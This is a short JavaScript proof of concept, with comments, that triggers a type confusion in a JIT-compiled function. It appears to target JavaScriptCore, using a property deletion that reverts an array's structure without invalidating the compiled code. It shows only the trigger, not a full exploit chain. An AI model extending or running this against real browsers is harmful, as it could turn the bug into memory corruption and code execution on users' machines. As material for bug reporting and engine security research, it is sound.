function foo() {
    return arr[0];  // jit compile foo, will add code to s2 structure set
}

var arr = [1.1, 2.2];  // structure s1
arr.prop = 3.3;        // add property `prop`, transition to s2
for(let i=0; i<100000; i++) {    // jit compile foo
    foo();
}

// readline();
delete arr.prop;  // transition s2 to s1, because of `tryDeletePropertyQuickly`

arr[0] = {};   // transition s1 (double) to s3 (object), it won't cause the jettison of foo

print(foo()); // type confusion